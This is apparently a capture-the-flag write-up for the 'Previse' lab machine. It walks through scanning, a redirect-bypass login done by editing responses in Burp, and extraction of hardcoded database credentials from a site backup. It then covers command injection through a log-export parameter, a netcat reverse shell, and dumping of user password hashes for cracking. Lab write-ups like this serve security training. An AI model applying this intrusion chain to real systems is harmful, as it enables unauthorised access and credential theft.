## -------------->> Previce <<----------

// We start with nmap scan

    $ nmap -sV -A -Pn -T4 10.10.11.104
-----

    Nmap scan report for 10.129.214.117
    Host is up (0.32s latency).
    Not shown: 65533 closed ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
    |   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
    |_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    | http-title: Previse Login
    |_Requested resource was login.php
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


// Lets search some directories with [dirsearch](https://github.com/maurosoria/dirsearch)(By maurosoria)

$ python3 dirsearch.py -u http://10.10.11.104/ -t 100 

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 100 | Wordlist size: 10903

Output File: /home/kali/Desktop/Tools/dirsearch/reports/10.129.214.117/_21-08-10_20-00-52.txt

Error Log: /home/kali/Desktop/Tools/dirsearch/logs/errors-21-08-10_20-00-52.log

Target: http://10.10.11.104/ 

[20:00:52] Starting: 
[20:00:59] 301 -  313B  - /js  ->  http://10.10.11.104/js/
[20:01:00] 403 -  279B  - /.ht_wsr.txt
[20:01:00] 403 -  279B  - /.htaccess.bak1
[20:01:00] 403 -  279B  - /.htaccess.orig
[20:01:00] 403 -  279B  - /.htaccess.save
[20:01:00] 403 -  279B  - /.htaccess_orig
[20:01:00] 403 -  279B  - /.htaccessBAK
[20:01:00] 403 -  279B  - /.htaccess_extra
[20:01:00] 403 -  279B  - /.htaccess.sample
[20:01:00] 403 -  279B  - /.htaccess_sc
[20:01:00] 403 -  279B  - /.htaccessOLD2
[20:01:00] 403 -  279B  - /.htaccessOLD
[20:01:00] 403 -  279B  - /.html
[20:01:00] 403 -  279B  - /.htm
[20:01:00] 403 -  279B  - /.htpasswd_test
[20:01:00] 403 -  279B  - /.httr-oauth
[20:01:00] 403 -  279B  - /.htpasswds
[20:01:02] 403 -  279B  - /.php
[20:01:12] 302 -    4KB - /accounts.php  ->  login.php
[20:01:28] 200 -    0B  - /config.php
[20:01:29] 301 -  314B  - /css  ->  http://10.10.11.104/css/
[20:01:31] 302 -    0B  - /download.php  ->  login.php
[20:01:34] 200 -   15KB - /favicon.ico
[20:01:34] 302 -    5KB - /files.php  ->  login.php
[20:01:34] 200 -  217B  - /footer.php
[20:01:35] 200 -  980B  - /header.php
[20:01:37] 302 -    3KB - /index.php  ->  login.php
[20:01:37] 302 -    3KB - /index.php/login/  ->  login.php
[20:01:38] 200 -    1KB - /js/
[20:01:40] 200 -    2KB - /login.php
[20:01:40] 302 -    0B  - /logout.php  ->  login.php
[20:01:51] 403 -  279B  - /server-status
[20:01:51] 403 -  279B  - /server-status/
[20:01:53] 302 -    3KB - /status.php  ->  login.php

// Navigating to /accounts.php redirects us to /login.php

![Image 1]()

// So, since its the most interesting file i open BurpSuite and capture this request and send it to Reapter

![Image 3]()

// Its seems that we get the wanted request in Burp, BUT, the status its 302 so its redirects us

// tring to see the page accounts.php i have copied the HTML code from the response html file to see the content

![Image 2]()

// So now we can see that if we get this page we're basically loged in

// Also we could see that in BurpSuite reapter when change the response to render

![Image 4]()

// In BurpSuite u have an option to edit the request

// Right clicking on the request and select '' then ''

![Image ----]()

// Click 'forward', and now we can edit the status from '302 to '200'(Legitimate)

![Image 5]()

// And we're in !

![Image 6]()

// Now we can create ourselfs an account 

// In BurpSuite the request will look like this:

![Image 7]()

// Go back to /login.php and login with our new account

![Image 8]()

// When searching for juicy information in the tabs, we can see in files tab zipped file called 'SITEBACKUP.zip'

![Image 9]()

// Lets download it and see what we can get out of it

    $ unzip siteBackup.zip 

    Archive:  siteBackup.zip
      inflating: accounts.php            
      inflating: config.php              
      inflating: download.php            
      inflating: file_logs.php           
      inflating: files.php               
      inflating: footer.php              
      inflating: header.php              
      inflating: index.php               
      inflating: login.php               
      inflating: logout.php              
      inflating: logs.php                
      inflating: nav.php                 
      inflating: status.php              

// I will serach the strings contain the characters 'pass' 

    $ cd siteBackup/
    $ cat status.php | grep pass
    $ cat nav.php | grep pass
    $ cat download.php | grep pass
    $ cat logs.php | grep pass
    $ cat login.php | grep pass
    
            $password = $_POST['password'];
            } elseif (empty(trim($_POST['password']))) {
                    $passHash = $users['password'];
                    if (crypt($password, '$1$🧂llol$') == $passHash) {
                    <input type="password" name="password" class="uk-input" placeholder="Password" required>
                    
    $ cat config.php | grep pass

        $passwd = 'mySQL_p@ssw0rd!:)';
        $mycon = new mysqli($host, $user, $passwd, $db);



    $cat config.php 
    ....
    <?php

    function connectDB(){
        $host = 'localhost';
        $user = 'root';
        $passwd = 'mySQL_p@ssw0rd!:)';
        $db = 'previse';
        $mycon = new mysqli($host, $user, $passwd, $db);
        return $mycon;
    }

    ?>
    ....

// So, we found mysql credentials(in config.php) and the way that the passwords encrypted(in login.php)

// Lets move on, in the website that we login there is another tab called 'MANAGMENT DATA' -> 'LOG DATA'

![Image 10]()

// its seems that its some kind of communicating way with the server

// Taking the request to BurpSuite we can see the content

![Image 11]()

// Lets try manipulate this with chaniging the 'delim=' param to our needs

// First lets URL encode our inject syntax with [CyberChef](https://gchq.github.io/CyberChef/)

![Image 12]()

// And add it to the request

![Image 13]()

// The site was hang on for a minute and didnt respond 

// So, i opend wireshark on interface tun0 and searching for ICMP(ping) packets

// And send our modified request again

![Image 14]()

// It worked !! we can see that the server ping our host

// So, we know now that we can communicate directly with the server 

// Lets step up to a reverse shell using nc

![Image 15]()

// Open a listiner on our machine and send a modified request with nc encoded command

    $ nc -lvnp 1444
    listening on [any] 1444 ...
    connect to [10.10.16.6] from (UNKNOWN) [10.10.11.104] 51856
    id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

// We got shell !!!

// We can upgrade our shell with python(if exist)

    which python
    /usr/bin/python
    python -c "import pty;pty.spawn('/bin/sh')"
    $ 

// Great!, move on...

// As www-data user we dont have permissions on the user

// Since we got mysql credentials earlier lets see what we can get 

    $ mysql -u root -p previse                         
    mysql -u root -p previse
    Enter password: mySQL_p@ssw0rd!:)

------

    mysql> show databases;
    show databases;
    +--------------------+
    | Database           |
    +--------------------+
    | information_schema |
    | mysql              |
    | performance_schema |
    | previse            |
    | sys                |
    +--------------------+
    5 rows in set (0.00 sec)

    mysql> show databases;
    show databases;
    +--------------------+
    | Database           |
    +--------------------+
    | information_schema |
    | mysql              |
    | performance_schema |
    | previse            |
    | sys                |
    +--------------------+
    5 rows in set (0.00 sec)

    mysql> use previse;
    use previse;
    Database changed
    mysql> show tables;
    show tables;
    +-------------------+
    | Tables_in_previse |
    +-------------------+
    | accounts          |
    | files             |
    +-------------------+
    2 rows in set (0.00 sec)

    mysql> describe accounts;
    describe accounts;
    +------------+--------------+------+-----+-------------------+----------------+
    | Field      | Type         | Null | Key | Default           | Extra          |
    +------------+--------------+------+-----+-------------------+----------------+
    | id         | int(11)      | NO   | PRI | NULL              | auto_increment |
    | username   | varchar(50)  | NO   | UNI | NULL              |                |
    | password   | varchar(255) | NO   |     | NULL              |                |
    | created_at | datetime     | YES  |     | CURRENT_TIMESTAMP |                |
    +------------+--------------+------+-----+-------------------+----------------+
    4 rows in set (0.00 sec)

    mysql> select * from accounts;
    select * from accounts;
    +----+----------+------------------------------------+---------------------+
    | id | username | password                           | created_at          |
    +----+----------+------------------------------------+---------------------+
    |  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
    |  2 | W0lfysec | $1$🧂llol$rCfLNVEV/lMn6ru.fXs/a1 | 2021-09-09 12:46:25 |
    +----+----------+------------------------------------+---------------------+
    2 rows in set (0.00 sec)

// We got user 'm4lwhere' hash

// we can crack it using john 
